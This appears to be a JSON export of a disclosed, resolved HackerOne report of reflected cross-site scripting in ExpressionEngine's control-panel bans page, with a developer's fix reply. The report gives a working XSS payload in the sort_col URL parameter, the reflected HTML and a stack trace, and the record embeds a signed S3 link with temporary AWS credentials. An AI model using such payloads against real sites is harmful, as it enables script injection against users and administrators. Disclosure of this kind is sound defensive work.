{"id":177943,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzc5NDM=","url":"https://hackerone.com/reports/177943","title":"Reflective XSS","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-10-25T07:16:29.281Z","submitted_at":"2016-10-25T07:16:29.281Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hogarth45","url":"/hogarth45","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/LyKmffY4ogeLKvym8z7NB8vw/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":265,"url":"https://hackerone.com/expressionengine","handle":"expressionengine","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/265/25251ba4ab1d0b0304a6c3d197fba5c833c6003e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/265/25251ba4ab1d0b0304a6c3d197fba5c833c6003e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"ExpressionEngine","twitter_handle":"eecms","website":"https://expressionengine.com/","about":"ExpressionEngine is a robust and flexible open-source Content Management System."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-09-29T18:24:35.667Z","bug_reporter_agreed_on_going_public_at":"2017-09-28T17:42:58.842Z","team_member_agreed_on_going_public_at":"2017-09-29T18:24:35.619Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**URL**\nhttp://blackdoorsec.net/sandbox/express/admin.php?/cp/members/bans\u0026search=\u0026sort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3Ember_id\u0026sort_dir=desc\n\n**URL Parameters**\n/cp/members/bans\nsearch=\nsort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3Ember_id\nsort_dir=desc\n\nThe ```sort_col``` variable is reflected on the error page on line 15\n```\n\u003ch2\u003eUnknown field me\"\u003e\u003cimg src=x onerror=prompt(document.domain)\u003ember_id\u003c/h2\u003e\n```\n\nError Page Details (Note: hackerone remove html from past)\n```\nUnknown field me\"\u003ember_id\n\nee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php:356\nStack Trace: hide details\n\n    #0 ee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php(213): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Select-\u003etranslateProperty('me\"\u003e#1 ee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php(99): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Select-\u003eapplyOrders(Object(EllisLab\\ExpressionEngine\\Service\\Database\\Query), Array)\n    #2 ee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php(42): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Select-\u003ebuildQuery()\n    #3 ee/EllisLab/ExpressionEngine/Service/Model/DataStore.php(513): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Select-\u003erun()\n    #4 ee/EllisLab/ExpressionEngine/Service/Model/DataStore.php(459): EllisLab\\ExpressionEngine\\Service\\Model\\DataStore-\u003erunQuery('Select', Object(EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Builder))\n    #5 ee/EllisLab/ExpressionEngine/Service/Model/Query/Builder.php(156): EllisLab\\ExpressionEngine\\Service\\Model\\DataStore-\u003eselectQuery(Object(EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Builder))\n    #6 ee/EllisLab/ExpressionEngine/Service/Model/Query/Builder.php(75): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Builder-\u003efetch()\n    #7 ee/EllisLab/ExpressionEngine/Controller/Members/Members.php(571): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Builder-\u003eall()\n    #8 ee/EllisLab/ExpressionEngine/Controller/Members/Members.php(298): EllisLab\\ExpressionEngine\\Controller\\Members\\Members-\u003ebuildTableFromMemberQuery(Object(EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Builder))\n    #9 [internal function]: EllisLab\\ExpressionEngine\\Controller\\Members\\Members-\u003ebans()\n    #10 ee/EllisLab/ExpressionEngine/Core/Core.php(189): call_user_func_array(Array, Array)\n    #11 ee/EllisLab/ExpressionEngine/Core/Core.php(94): EllisLab\\ExpressionEngine\\Core\\Core-\u003erunController(Array)\n    #12 ee/EllisLab/ExpressionEngine/Boot/boot.php(151): EllisLab\\ExpressionEngine\\Core\\Core-\u003erun(Object(EllisLab\\ExpressionEngine\\Core\\Request))\n    #13 admin.php(143): require_once('...')\n    #13 admin.php(143): require_once('...') \n```\n\nLine 356 of Select.php\n```\nthrow new \\Exception(\"Unknown field {$alias}.{$property}\");\n```","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eURL\u003c/strong\u003e\u003cbr\u003e\n\u003ca title=\"http://blackdoorsec.net/sandbox/express/admin.php?/cp/members/bans\u0026amp;search=\u0026amp;sort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3Ember_id\u0026amp;sort_dir=desc\" href=\"/redirect?url=http%3A%2F%2Fblackdoorsec.net%2Fsandbox%2Fexpress%2Fadmin.php%3F%2Fcp%2Fmembers%2Fbans%26search%3D%26sort_col%3Dme%2522%253E%253Cimg%2520src%3Dx%2520onerror%3Dprompt%28document.domain%29%253Ember_id%26sort_dir%3Ddesc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://blackdoorsec.net/sandbox/express/admin.php?/cp/members/bans\u0026amp;search=\u0026amp;sort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3Ember_id\u0026amp;sort_dir=desc\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eURL Parameters\u003c/strong\u003e\u003cbr\u003e\n/cp/members/bans\u003cbr\u003e\nsearch=\u003cbr\u003e\nsort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3Ember_id\u003cbr\u003e\nsort_dir=desc\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003esort_col\u003c/code\u003e variable is reflected on the error page on line 15\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;h2\u0026gt;Unknown field me\u0026quot;\u0026gt;\u0026lt;img src=x onerror=prompt(document.domain)\u0026gt;mber_id\u0026lt;/h2\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eError Page Details (Note: hackerone remove html from past)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eUnknown field me\u0026quot;\u0026gt;mber_id\n\nee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php:356\nStack Trace: hide details\n\n    #0 ee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php(213): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Select-\u0026gt;translateProperty(\u0026#39;me\u0026quot;\u0026gt;#1 ee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php(99): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Select-\u0026gt;applyOrders(Object(EllisLab\\ExpressionEngine\\Service\\Database\\Query), Array)\n    #2 ee/EllisLab/ExpressionEngine/Service/Model/Query/Select.php(42): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Select-\u0026gt;buildQuery()\n    #3 ee/EllisLab/ExpressionEngine/Service/Model/DataStore.php(513): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Select-\u0026gt;run()\n    #4 ee/EllisLab/ExpressionEngine/Service/Model/DataStore.php(459): EllisLab\\ExpressionEngine\\Service\\Model\\DataStore-\u0026gt;runQuery(\u0026#39;Select\u0026#39;, Object(EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Builder))\n    #5 ee/EllisLab/ExpressionEngine/Service/Model/Query/Builder.php(156): EllisLab\\ExpressionEngine\\Service\\Model\\DataStore-\u0026gt;selectQuery(Object(EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Builder))\n    #6 ee/EllisLab/ExpressionEngine/Service/Model/Query/Builder.php(75): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Builder-\u0026gt;fetch()\n    #7 ee/EllisLab/ExpressionEngine/Controller/Members/Members.php(571): EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Builder-\u0026gt;all()\n    #8 ee/EllisLab/ExpressionEngine/Controller/Members/Members.php(298): EllisLab\\ExpressionEngine\\Controller\\Members\\Members-\u0026gt;buildTableFromMemberQuery(Object(EllisLab\\ExpressionEngine\\Service\\Model\\Query\\Builder))\n    #9 [internal function]: EllisLab\\ExpressionEngine\\Controller\\Members\\Members-\u0026gt;bans()\n    #10 ee/EllisLab/ExpressionEngine/Core/Core.php(189): call_user_func_array(Array, Array)\n    #11 ee/EllisLab/ExpressionEngine/Core/Core.php(94): EllisLab\\ExpressionEngine\\Core\\Core-\u0026gt;runController(Array)\n    #12 ee/EllisLab/ExpressionEngine/Boot/boot.php(151): EllisLab\\ExpressionEngine\\Core\\Core-\u0026gt;run(Object(EllisLab\\ExpressionEngine\\Core\\Request))\n    #13 admin.php(143): require_once(\u0026#39;...\u0026#39;)\n    #13 admin.php(143): require_once(\u0026#39;...\u0026#39;) \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLine 356 of Select.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ethrow new \\Exception(\u0026quot;Unknown field {$alias}.{$property}\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":130016,"file_name":"ellis1.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/130/016/c85e5d56a56c7ddcc95e30d119de85c548379fe9/ellis1.JPG?response-content-disposition=attachment%3B%20filename%3D%22ellis1.JPG%22%3B%20filename%2A%3DUTF-8%27%27ellis1.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ25CUMV77%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044353Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzPBxfjhI%2FOiR%2B1g7qgHtu%2BTSWR72ZbKmRPdv61x9tZAiEA7d5guv7RrcybHHoMbJ5xcSYkf5cIncRQif%2BDwrhUxL4qtAMIURABGgwwMTM2MTkyNzQ4NDkiDLU8cXGXokn2dJzgWyqRA5t82BwvWjjXR1flrxPY1G8nb%2BmyZbhMX7bIDSshUvXOZWrYMuqnjFp50lwKRioT0tqSyswhE%2FmxcGN2dZffgFfm45Y15zW32QivQspJz2zpwJxFycBtjnRvl%2FMGegWgMTliaPfGzxGYLkpzI0cHFjLk%2BKaC50Jxtx51oChC%2BCytCTVfzOq2Ax%2BcOQ92r8%2FEVvUqeZR%2BTPUidVPdANT%2FJyfcDkVZSZzQz9EjBhPlfadpw5dBs4QJ%2BDdADV0MdhKltTlk%2FyXYCPqWqRloAtWd1nGtuRb2iTe6dG%2FjlvEdGxsyq3XSWVpxob44SfkNT25WtiGoWTrQta7tHUBAIeejr1qo89oGEttSf7d8Lku1wWROst97KwhMf%2B%2Bj34q6jzK8i1Hw8XE5vydIGbQfSR452%2FCUDzasjIErk2%2F0Ktvsz%2Bx3csi5j3IwrXlZf4YgORAmKN1LdQQkzS%2BV1sgEfBg4MiQjSsKotzm%2FUgXxu10BwEW2Dhb8oNMpsZ1FjdjbCQGOQD7Feifp2fVzXkXhF1DMwndWMOrpqf8FOusBKlCtIwN5UHYU%2F5Q2IWJVa2twlUdU6iZvdqJG%2FbyL1HncSkMTTf174kVtrd08ZtfhfQ%2B%2FGZMeT3%2BWmMgtiSxiN8zlfLWyyOmRNNNrcZLeamXU8gijNm5O%2FRQyUqS40M%2B09rACFWxFC6eSAj2%2BBOBxHA6bEgtgV3Z6D4uLX3zxwXXu%2BF%2BhhCTXgcbobecE2HXiCLYk05uES7bSCIeUoggVUmunssom%2Bu8yCYvg2qvqpHVNwChBmtVZLiGt79EkgpsqfgvK113rJiRtjBkxEHINtbd%2FcmRPwl2VUc1W%2BEpCc%2FxxQcCayPndzJKPSw%3D%3D\u0026X-Amz-Signature=51cc81e47142c1e70c76528ac0267a046abb74a190e8ce1d8eefe514e8e13e3f","file_size":63773,"type":"image/jpeg"}],"allow_singular_disclosure_at":null,"vote_count":4,"voters":["jensec","r3y","mr_r3boot","sumit7"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1266823,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks, @hogarth45! You're right, looks like we weren't validating that parameter. I've fixed it up so that all the tables in the members section of the CP are getting proper validation now. The fix will be in our next stability release which should be soon. Thanks again!","markdown_message":"\u003cp\u003eThanks, \u003ca href=\"/hogarth45\"\u003e@hogarth45\u003c/a\u003e! You\u0026#39;re right, looks like we weren\u0026#39;t validating that parameter. I\u0026#39;ve fixed it up so that all the tables in the members section of the CP are getting proper validation now. The fix will be in our next stability release which should be soon. Thanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-25T15:30:58.542Z","updated_at":"2016-10-25T15:30:58.542Z","actor":{"username":"kevincupp","cleared":false,"url":"/kevincupp","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"hogarth45","url":"/hogarth45"},"genius_execution_id":null,"team_handle":"expressionengine","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2030787,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-28T17:42:58.864Z","updated_at":"2017-09-28T17:42:58.864Z","first_to_agree":true,"actor":{"username":"hogarth45","cleared":true,"url":"/hogarth45","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/LyKmffY4ogeLKvym8z7NB8vw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"expressionengine","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2033563,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-29T18:24:35.635Z","updated_at":"2017-09-29T18:24:35.635Z","actor":{"username":"kevincupp","cleared":false,"url":"/kevincupp","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"expressionengine","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2033564,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-29T18:24:35.688Z","updated_at":"2017-09-29T18:24:35.688Z","actor":{"username":"kevincupp","cleared":false,"url":"/kevincupp","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"expressionengine","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}